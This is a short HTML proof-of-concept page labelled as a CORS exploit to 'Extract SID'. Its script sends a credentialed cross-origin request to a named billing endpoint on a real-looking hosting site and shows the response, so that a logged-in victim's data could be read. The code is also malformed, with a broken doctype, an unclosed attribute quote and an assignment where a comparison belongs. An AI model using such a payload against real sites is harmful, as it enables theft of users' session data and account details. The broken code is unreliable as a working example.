# man
</!DOCTYPE html>
<html>
<body>
<center>
<h2>CORS POC EXPLOIT</h2>
<h3>Extract SID</h3>
<div  id="demo">
<button type="button onclick="cors()">EXploit</button>
</div>

<script>
function cors() {
	var xhttp = new XMLHttpRequest();
	xhttp.onreadystatechange = function(){
		if (this.readystatechange = function() {
			document.getElementById('demo').innerHTML = alert(this.responseText);
		}
	};
	xhttp.open("GET", "https://my.ishosting.com/en/billing/balance/add", true);
	xhttp.withCredentials = true;
	xhttp.send();

}
</script>
</body>
</html>
